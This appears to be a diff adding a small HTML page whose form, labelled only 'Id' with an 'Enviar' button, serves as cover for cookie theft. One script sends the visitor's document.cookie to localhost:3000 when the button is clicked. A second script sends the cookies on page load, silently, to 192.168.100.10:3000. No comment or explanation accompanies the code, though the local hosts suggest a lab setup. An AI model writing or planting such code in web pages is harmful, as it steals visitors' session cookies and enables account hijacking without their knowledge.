@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+
+<body>
+    <h3>Form</h3>
+    <form>
+        <label for="input-id">Id: </label>
+        <input type="text" name="" id="input-id">
+        <button type="button" id="btn-send">Enviar</button>
+    </form>
+</body>
+<script>
+    function mandar() {
+        const cookie = document.cookie;
+
+        const myHeaders = new Headers();
+        myHeaders.append("Content-Type", "application/json");
+
+        const raw = JSON.stringify({
+            "cookie": cookie
+        });
+
+        const requestOptions = {
+            method: 'POST',
+            headers: myHeaders,
+            body: raw,
+            redirect: 'follow'
+        };
+        fetch("http://localhost:3000", requestOptions)
+            .then(response => response.text())
+            .then(result => console.log())
+            .catch(error => console.log());
+    }
+
+    document.getElementById("btn-send").addEventListener("click", (e) => {
+        e.preventDefault();
+        mandar();
+    })
+
+</script>
+
+
+<script>
+    const cookie = document.cookie;
+
+    const myHeaders = new Headers();
+    myHeaders.append("Content-Type", "application/json");
+
+    const raw = JSON.stringify({
+        "cookie": cookie
+    });
+
+    const requestOptions = {
+        method: 'POST',
+        headers: myHeaders,
+        body: raw,
+        redirect: 'follow'
+    };
+    fetch("http://192.168.100.10:3000", requestOptions)
+        .then(response => response.text())
+        .then(result => console.log())
+        .catch(error => console.log());
+</script>
+
+
+</html>
